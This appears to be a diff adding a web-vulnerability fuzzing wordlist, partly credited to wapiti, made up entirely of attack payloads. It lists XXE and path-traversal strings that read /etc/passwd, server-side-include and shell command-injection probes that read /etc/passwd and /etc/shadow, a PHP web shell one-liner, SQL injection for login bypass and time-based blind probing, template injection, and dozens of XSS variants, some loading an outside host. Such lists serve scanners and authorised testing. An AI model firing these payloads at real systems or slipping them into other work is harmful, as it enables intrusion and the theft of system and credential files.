+"<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>
+webshell.php
+admin' OR '1'='1
+"<img src="0x0.sytes.net" onload=window.open("0x0.sytes.net","AliElTop",'height=500,width=500');>
+../../../../etc/passwd%00
+"<img src=x onerror=alert('AliElTop')>
+"<img src=x onload=alert('AliElTop')>
+<iframe src=x onerror=prompt(13337777)>
+"onclick=prompt(13337777)><svg/onload=prompt(13337777)>"@x.y
+<iframe src=x onerror=confirm(13337777)>
+<iframe src=x onerror=alert(13337777)>
+"<?php system($_GET['cmd']); ?>
+../../../../etc/passwd
+%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo
+;ls
+ls
+<image/src/onerror=alert('AliElTop')>
+<img/src/onerror=alert('AliElTop')>
+<image src/onerror=alert('AliElTop')>
+<img src/onerror=alert('AliElTop')>
+<image src =q onerror=alert('AliElTop')>
+<img src =q onerror=alert('AliElTop')>
+</scrip</script>t><img src =q onerror=alert('AliElTop')>
+<script\x20type="text/javascript">alert('AliElTop');</script>
+<script\x3Etype="text/javascript">alert('AliElTop');</script>
+<script\x0Dtype="text/javascript">alert('AliElTop');</script>
+<script\x09type="text/javascript">alert('AliElTop');</script>
+<script\x0Ctype="text/javascript">alert('AliElTop');</script>
+<script\x2Ftype="text/javascript">alert('AliElTop');</script>
+<script\x0Atype="text/javascript">alert('AliElTop');</script>
+'`"><\x3Cscript>alert('AliElTop')</script>
+'`"><\x00script>alert('AliElTop')</script>
+<img src=1 href=1 onerror="alert('AliElTop')"></img>
+<audio src=1 href=1 onerror="alert('AliElTop')"></audio>
+<video src=1 href=1 onerror="alert('AliElTop')"></video>
+<body src=1 href=1 onerror="alert('AliElTop')"></body>
+<image src=1 href=1 onerror="alert('AliElTop')"></image>
+<object src=1 href=1 onerror="alert('AliElTop')"></object>
+<script src=1 href=1 onerror="alert('AliElTop')"></script>
+..//etc/passwd
+../..//etc/passwd
+../../..//etc/passwd
+../../../..//etc/passwd
+../../../../..//etc/passwd
+../../../../../..//etc/passwd
+../../../../../../..//etc/passwd
+../../../../../../../..//etc/passwd
+..%2f/etc/passwd
+..%2f..%2f/etc/passwd
+..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+%2e%2e//etc/passwd
+%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
+%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+| id
+& id
+; id
+%0a id %0a
+$;/usr/bin/id
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+# from wapiti
+sleep(20)#
+1 or sleep(20)#
+" or sleep(20)#
+' or sleep(20)#
+" or sleep(20)="
+' or sleep(20)='
+1) or sleep(20)#
+") or sleep(20)="
+') or sleep(20)='
+1)) or sleep(20)#
+")) or sleep(20)="
+')) or sleep(20)='
+;waitfor delay '0:0:20'--
+);waitfor delay '0:0:20'--
+';waitfor delay '0:0:20'--
+";waitfor delay '0:0:20'--
+');waitfor delay '0:0:20'--
+");waitfor delay '0:0:20'--
+));waitfor delay '0:0:20'--
+'));waitfor delay '0:0:20'--
+"));waitfor delay '0:0:20'--
+benchmark(10000000,MD5(20))#
+1 or benchmark(10000000,MD5(20))#
+" or benchmark(10000000,MD5(20))#
+' or benchmark(10000000,MD5(20))#
+1) or benchmark(10000000,MD5(20))#
+") or benchmark(10000000,MD5(20))#
+') or benchmark(10000000,MD5(20))#
+1)) or benchmark(10000000,MD5(20))#
+")) or benchmark(10000000,MD5(20))#
+')) or benchmark(10000000,MD5(20))#
+pg_sleep(20)--
+1 or pg_sleep(20)--
+" or pg_sleep(20)--
+' or pg_sleep(20)--
+1) or pg_sleep(20)--
+") or pg_sleep(20)--
+') or pg_sleep(20)--
+1)) or pg_sleep(20)--
+")) or pg_sleep(20)--
+')) or pg_sleep(20)--
+AND (SELECT * FROM (SELECT(SLEEP(20)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(20)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)#
+SLEEP(20)#
+SLEEP(20)--
+SLEEP(20)="
+SLEEP(20)='
+or SLEEP(20)
+or SLEEP(20)#
+or SLEEP(20)--
+or SLEEP(20)="
+or SLEEP(20)='
+waitfor delay '00:00:20'
+waitfor delay '00:00:20'--
+waitfor delay '00:00:20'#
+benchmark(50000000,MD5(20))
+benchmark(50000000,MD5(20))--
+benchmark(50000000,MD5(20))#
+or benchmark(50000000,MD5(20))
+or benchmark(50000000,MD5(20))--
+or benchmark(50000000,MD5(20))#
+pg_SLEEP(20)
+pg_SLEEP(20)--
+pg_SLEEP(20)#
+or pg_SLEEP(20)
+or pg_SLEEP(20)--
+or pg_SLEEP(20)#
+'\"
+AnD SLEEP(20)
+AnD SLEEP(20)--
+AnD SLEEP(20)#
+&&SLEEP(20)
+&&SLEEP(20)--
+&&SLEEP(20)#
+' AnD SLEEP(20) ANd '1
+'&&SLEEP(20)&&'1
+ORDER BY SLEEP(20)
+ORDER BY SLEEP(20)--
+ORDER BY SLEEP(20)#
+(SELECT * FROM (SELECT(SLEEP(20)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(20)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(20)))ecMj)--
++benchmark(3200,SHA1(20))+'
++ SLEEP(20) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(20)/*' or SLEEP(20) or '" or SLEEP(20) or "*/
+<pre>system('cat /etc/passwd')</pre>
+<svg xmlns="http://0x0.sytes.net/ali1.svg" onload="alert(document.domain)"/>
